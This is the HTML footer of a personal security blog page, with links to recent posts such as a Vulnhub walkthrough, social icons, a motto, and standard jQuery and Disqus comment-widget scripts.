                <a class="footer-post" href="/2016/11/30/Red-Team-Ratatouille/">The Red Team&#39;s Ratatouill</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2016/11/24/Vulnhub-Hackday-Albania/">Vulnhub: Hackday Albania</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2016/11/23/A-new-beginning/">A new beginning</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus-x.github.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/One_PlusX?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus.github.io/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus.github.io/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus.github.io/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus.github.io/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus.github.io/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://oneplus.github.io/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:legendtanoybose@gmail.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    If your actions inspire others to dream more, learn more, do more and become more, you are a leader.
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->

<script type="text/javascript">
    var disqus_shortname = 'oneplus';

    (function(){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



</body>

</html>